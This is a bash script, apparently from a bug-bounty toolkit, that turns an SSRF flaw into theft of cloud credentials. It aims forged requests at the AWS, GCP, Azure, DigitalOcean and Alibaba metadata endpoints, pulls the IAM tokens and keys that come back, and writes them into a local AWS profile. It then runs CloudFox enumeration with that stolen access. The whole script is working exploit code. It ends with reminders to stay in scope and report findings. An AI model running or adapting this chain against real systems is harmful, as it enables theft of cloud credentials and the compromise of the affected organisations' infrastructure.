#!/usr/bin/env bash
# chain/ssrf-cloud-creds.sh
#
# SSRF → cloud metadata service → IAM credentials → CloudFox enumeration.
# Probably the highest-payout chain in modern bug bounty (5-figure typical).

PHASE="chain-ssrf-cloud"
. "$(dirname "$0")/../vuln/_lib.sh"
require_target
ensure_scope
OUTDIR=$(out_dir "$PHASE")

SSRF_URL="${SSRF_URL:-}"
SSRF_PARAM="${SSRF_PARAM:-url}"
[ -z "$SSRF_URL" ] && { log ERR "SSRF_URL required (a URL where the SSRF fetches from the value of \$SSRF_PARAM)"; exit 2; }

# Step 1: try each cloud's metadata endpoint
declare -A METADATA=(
    [AWS]='http://169.254.169.254/latest/meta-data/iam/security-credentials/'
    [AWS_IMDSV2_TOKEN]='http://169.254.169.254/latest/api/token'
    [GCP]='http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'
    [Azure]='http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'
    [DO]='http://169.254.169.254/metadata/v1/'
    [Alibaba]='http://100.100.100.200/latest/meta-data/'
)

for cloud in "${!METADATA[@]}"; do
    meta_url="${METADATA[$cloud]}"
    forged=$(echo "$SSRF_URL" | sed "s|${SSRF_PARAM}=[^&]*|${SSRF_PARAM}=$(printf '%s' "$meta_url" | jq -sRr @uri)|")
    log INFO "probing $cloud metadata via $forged"

    # GCP requires the Metadata-Flavor header — if the SSRF lets us pass
    # headers we'd use it; for now this is a best-effort GET.
    headers=()
    [ "$cloud" = "GCP" ] && headers+=(-H 'Metadata-Flavor: Google')
    [ "$cloud" = "Azure" ] && headers+=(-H 'Metadata: true')

    resp=$(curl -sS --max-time 12 "${headers[@]}" "$forged" 2>/dev/null | head -c 4000)
    if [ -n "$resp" ] && ! echo "$resp" | grep -qiE "(forbidden|not found|error|denied)" ; then
        echo "$resp" > "$OUTDIR/${cloud}.txt"
        log INFO "  ✓ $cloud responded — see $OUTDIR/${cloud}.txt"

        # Try to extract IAM creds heuristically
        if echo "$resp" | grep -qE 'AccessKeyId|SecretAccessKey|access_token'; then
            log INFO "  ✓✓ CREDENTIALS FOUND in $cloud response"
            echo "$resp" > "$OUTDIR/CREDS-$cloud.txt"
            chmod 600 "$OUTDIR/CREDS-$cloud.txt"
        fi
    fi
done

# Step 2: if we got AWS creds, immediately enumerate with CloudFox
if [ -s "$OUTDIR/CREDS-AWS.txt" ] && command -v cloudfox >/dev/null 2>&1; then
    log INFO "step 2: extracting AWS creds → CloudFox enum"
    AK=$(grep -oE 'AccessKeyId":\s*"[^"]+"' "$OUTDIR/CREDS-AWS.txt" | cut -d'"' -f3)
    SK=$(grep -oE 'SecretAccessKey":\s*"[^"]+"' "$OUTDIR/CREDS-AWS.txt" | cut -d'"' -f3)
    TOK=$(grep -oE 'Token":\s*"[^"]+"' "$OUTDIR/CREDS-AWS.txt" | cut -d'"' -f3)

    if [ -n "$AK" ] && [ -n "$SK" ]; then
        log INFO "  configuring AWS profile 'ssrf-extracted'"
        mkdir -p ~/.aws
        cat >> ~/.aws/credentials <<EOF
[ssrf-extracted]
aws_access_key_id = $AK
aws_secret_access_key = $SK
aws_session_token = $TOK
EOF
        chmod 600 ~/.aws/credentials
        log INFO "  running cloudfox aws all-checks (CHAIN-LEVEL HIGH IMPACT)"
        cloudfox aws all-checks --profile ssrf-extracted -o "$OUTDIR/cloudfox-out" 2>&1 | tee "$OUTDIR/cloudfox.log"
    fi
fi

log INFO "ssrf-cloud-creds done — see $OUTDIR/{AWS,GCP,Azure,DO,Alibaba}.txt + CREDS-*.txt"
log INFO "If credentials were extracted, IMMEDIATELY"
log INFO "  1. screenshot the metadata response for the report"
log INFO "  2. NOTIFY the program — these creds may be production"
log INFO "  3. do NOT use them outside the metadata-confirmation scope"
